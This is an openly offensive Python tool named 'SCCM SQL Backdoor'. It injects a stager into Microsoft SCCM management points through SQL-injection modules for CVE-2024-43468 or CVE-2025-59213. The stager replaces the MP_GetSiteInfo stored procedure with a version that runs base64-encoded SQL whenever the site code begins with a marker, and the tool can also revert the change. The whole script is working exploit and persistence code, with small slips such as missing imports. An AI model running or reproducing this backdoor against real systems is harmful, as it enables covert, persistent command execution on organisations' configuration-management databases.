#!/usr/bin/env python3
import argparse
import gzip
import logging
import re
import uuid
import zlib
from base64 import b64encode

import requests
import urllib3
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
from cryptography.x509 import ObjectIdentifier
from cryptography.x509.oid import NameOID
from requests_toolbelt import multipart
import importlib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SCCM_SQL_HTTP:

    unauth_request_endpoint = "/ccm_system_altauth/request"

    dummy_package_id = f"UID:{uuid.uuid4()}"

    tpl_multipart = b"--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: text/plain; charset=UTF-16\r\n\r\n%b\r\n--aAbBcCdDv1234567890VxXyYzZ\r\ncontent-type: application/octet-stream\r\n\r\n%b\r\n--aAbBcCdDv1234567890VxXyYzZ--"

    tpl_msg = f"""<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="{{LENGTH}}" Offset="0" /><CorrelationID>{{{{00000000-0000-0000-0000-000000000000}}}}</CorrelationID><Hooks><Hook3 Name="zlib-compress" /></Hooks><ID>{{{{00000000-0000-0000-0000-000000000000}}}}</ID><Payload Type="inline"/><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:dummyEndpoint:LS_ReplyLocations</ReplyTo><TargetAddress>mp:[http]{{TARGET_ENDPOINT}}</TargetAddress><TargetEndpoint>{{TARGET_ENDPOINT}}</TargetEndpoint><TargetHost>{{TARGET}}</TargetHost><Timeout>60000</Timeout><SourceID>{{MACHINE_ID}}</SourceID></Msg>"""

    tpl_SiteInformationRequest = """<SiteInformationRequest><SiteCode Name="{SITECODE}" /></SiteInformationRequest>\x00"""

    original_spo = """
--  
-- Name         : MP_GetSiteInfo  
-- Version      : 5.0.9135.1008 
-- Definition   : SqlObjs  
-- Scope        : PRIMARY_OR_SECONDARY  
-- Object       : P  
-- Dependencies : <Detect>  
-- Description  : SP used by the MP to get information about site(s)  
--  
ALTER PROCEDURE [dbo].[MP_GetSiteInfo]  
 @SiteCode nvarchar(3)  
AS  
BEGIN  
-- Set to avoid OLE DB returning multiple rowsets  
SET NOCOUNT ON  
  
SELECT s.SiteCode, s.Version, s.BuildNumber, s.Settings, isnull(s.DefaultMP, N'') as DefaultMP, 
       CONVERT(nvarchar(max),s.Capabilities) as Capabilities  
FROM Sites s  
WHERE s.SiteCode = @SiteCode and s.SiteType=2 
union all 
SELECT s.SiteCode, s.Version, s.BuildNumber, s.Settings, isnull(s.DefaultMP, N'') as DefaultMP, 
       CONVERT(nvarchar(max),s.Capabilities) as Capabilities  
FROM Sites s  
join Sites ss on s.SiteCode=ss.ReportToSite 
WHERE (ss.SiteCode = @SiteCode) and ss.SiteType=1 
ORDER BY s.SiteCode  
  
END  
"""


    def __init__(self, target, key, cert):
        self._target = target
        self._pkey = key
        self._cert = cert


    def __ccm_post(self, path, data):
        headers = {"User-Agent": "ConfigMgr Messaging HTTP Sender", "Content-Type": 'multipart/mixed; boundary="aAbBcCdDv1234567890VxXyYzZ"'}
        
        #print(f">>>> HTTP Request <<<<<\n{data.decode('utf-16-le')}\n")
        r = requests.request("CCM_POST", f"{self._target}{path}", headers=headers, data=data, verify=False, cert=(self._cert, self._pkey))
        logging.debug(f">>>> Response : {r.status_code} {r.reason} <<<<<\n{r.text[:8000]}\n")
        try:
            multipart_data = multipart.decoder.MultipartDecoder.from_response(r)
            for part in multipart_data.parts:
                if part.headers[b'content-type'] == b'application/octet-stream':
                    deflatedData = zlib.decompress(part.content).decode('utf-16')
                    logging.debug(deflatedData)
        except Exception as e:
            logging.error(e)
            deflatedData = ""
            pass
        return deflatedData


    def __ccm_system_request(self, header, request):
        multipart_body = self.tpl_multipart % (header.encode("utf-16"), zlib.compress(request))

        # print(f">>>> Header <<<<<\n{header}\n")
        logging.debug(f">>>> Request <<<<<\n{request.decode()}\n")

        return self.__ccm_post(self.unauth_request_endpoint, multipart_body)

    # MP_GetAssignedSite
    def do_revert(self, marker='ABC'):
        client_fqdn = f"{marker}:{b64encode(self.original_spo.encode()).decode()}"
        request_body = self.tpl_SiteInformationRequest.format(SITECODE=client_fqdn)
        request = b"%s\r\n" % request_body.encode('utf-16')[2:]
        header = self.tpl_msg.format(LENGTH=len(request) - 2, TARGET=self._target, TARGET_ENDPOINT="MP_LocationManager", MACHINE_ID=self.dummy_package_id)
        resp = self.__ccm_system_request(header, request)
        r = re.findall("<SecurityConfiguration>([^<]+)</SecurityConfiguration>", resp)
        if len(r):
            match =  r[0]
            logging.debug(f"Got Output")
            output = loads(b64decode(match).decode(encoding='latin1', errors='backslashreplace'))[0]
            logging.debug(output)
            try:
                self.rows = loads(output.get('rows', '[]'))
            except:
                self.rows = []
            self.rowcount = output.get('rc', None)
            self.error = output.get('err', None)
            return self.rows
        else:
            logging.error("Failed to get output in response")
            return None
        
    def do_check(self, sitecode):
        request_body = self.tpl_SiteInformationRequest.format(SITECODE=sitecode)
        request = b"%s\r\n" % request_body.encode('utf-16')[2:]
        header = self.tpl_msg.format(LENGTH=len(request) - 2, TARGET=self._target, TARGET_ENDPOINT="MP_LocationManager", MACHINE_ID=self.dummy_package_id)
        resp = self.__ccm_system_request(header, request)
        print(resp)

tpl_inject_stager = "DECLARE @s NVARCHAR(MAX)=(SELECT CAST(dbo.fnDecompressData(dbo.fnConvertBase64StringToBinary('{PAYLOAD}'))AS VARCHAR(max)));EXEC(@s)"

spo_stager = """
-- Name         : MP_GetSiteInfo  
-- Version      : 5.0.9135.1008 
-- Definition   : SqlObjs  
-- Scope        : PRIMARY_OR_SECONDARY  
ALTER PROCEDURE [dbo].[MP_GetSiteInfo] @SiteCode nvarchar(MAX) 
AS  
BEGIN  
	IF @SiteCode LIKE '{MARKER}:%'
	BEGIN
		DECLARE @s NVARCHAR(MAX) = CAST(dbo.fnConvertBase64StringToBinary(RIGHT(@SiteCode, LEN(@SiteCode)-4)) as VARCHAR(MAX)); EXEC (@s);
	END
	ELSE
	BEGIN 
		SET NOCOUNT ON  
		SELECT s.SiteCode, s.Version, s.BuildNumber, s.Settings, isnull(s.DefaultMP, N'') as DefaultMP, CONVERT(nvarchar(max),s.Capabilities) as Capabilities FROM Sites s WHERE s.SiteCode = @SiteCode and s.SiteType=2 
		union all 
		SELECT s.SiteCode, s.Version, s.BuildNumber, s.Settings, isnull(s.DefaultMP, N'') as DefaultMP, CONVERT(nvarchar(max),s.Capabilities) as Capabilities FROM Sites s join Sites ss on s.SiteCode=ss.ReportToSite WHERE (ss.SiteCode = @SiteCode) and ss.SiteType=1 ORDER BY s.SiteCode  
	END 
END 
"""

if __name__ == "__main__":
    default_marker = "RSA"

    parser = argparse.ArgumentParser(description="SCCM SQL Backdoor")  
    parser.add_argument("-t", "--target", action="store", required=True, default=None, help="Target (http://sccm-mp.local/)") 
    parser.add_argument("-debug", action="store_true", help="Turn DEBUG output ON")
    subparsers = parser.add_subparsers(dest="command", help="")

    cve_24 = subparsers.add_parser('CVE-2024-43468', help='Use CVE-2024-43468 to inject the SPO backdoor')
    cve_24.add_argument("-a", "--altauth", action="store_true", required=False, default=False, help="Use the MP's alternate authentication endpoint (Default: False)")
    cve_24.add_argument("-m", "--marker", action="store", required=False, default=default_marker, help="Override marker to trigger the backdoor (Default: ABC)")
    cve_24.add_argument("-k", "--key", action="store", required=False, default=None, help="Private key file for mTLS")
    cve_24.add_argument("-c", "--cert", action="store", required=False, default=None, help="Certificate file")

    cve_25 = subparsers.add_parser('CVE-2025-59213', help='Use CVE-2025-59213 to inject the SPO backdoor')
    cve_25.add_argument("-a", "--altauth", action="store_true", required=False, default=False, help="Use the MP's alternate authentication endpoint (Default: False)")
    cve_25.add_argument("-m", "--marker", action="store", required=False, default=default_marker, help="Override marker to trigger the backdoor (Default: ABC)")
    cve_25.add_argument("-k", "--key", action="store", required=False, default=None, help="Private key file for mTLS")
    cve_25.add_argument("-c", "--cert", action="store", required=False, default=None, help="Certificate file")
    cve_25.add_argument("-sk", "--sigkey", action="store", required=False, default=None, help="SMS signature key")

    cve_25.add_argument("-v", "--verbose", action="store_true", required=False, default=False, help="Verbose output, print requests")
    cve_25.add_argument("-cn", "--client-name", action="store", required=True, default=False, help="Name of the client that will be created in SCCM")
    cve_25.add_argument("-rs", "--registration-sleep", action="store", required=False, default=2, help="The amount of time, in seconds, that should be waited after registrating a new device (2 seconds by default)")
   
    revert_parser = subparsers.add_parser('revert', help="Revert the changes to the original SPO")
    revert_parser.add_argument("-m", "--marker", action="store", required=False, default=default_marker, help="Override marker to trigger the backdoor (Default: ABC)")


    args = parser.parse_args()

    if args.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.getLogger('chardet.charsetprober').setLevel(logging.INFO)
    else:
        logging.getLogger().setLevel(logging.INFO)

    if args.command == 'revert':
        sccm_sql_http = SCCM_SQL_HTTP(args.target, None, None)
        sccm_sql_http.do_revert(args.marker)
    else :
        try:
            # Dynamic import
            exploit_module = importlib.import_module(f'{args.command}.{args.command}')
        except ImportError:
            print(f"[!] Error: {args.command}.py not found in current directory.")
            exit()

        payload = b64encode(gzip.compress(spo_stager.format(MARKER=args.marker).encode())).decode()        
        sql_inject_stager = tpl_inject_stager.format(PAYLOAD=payload)

        if args.command == 'CVE-2025-59213':
            if len(args.marker) > 3:
                print(f"[!] Error: Because of length constraints, the marker is limited to 3 characters.")
                exit()
            exploit_module.SCCM(args.target, args.key, args.cert, args.sigkey, sql_inject_stager, altAuth=args.altauth, verbose=args.verbose).exploit(args.client_name, int(args.registration_sleep))
        else:
            exploit_module.SCCM(args.target, args.key, args.cert, altAuth=args.altauth).sqli_machineID(sql_inject_stager)

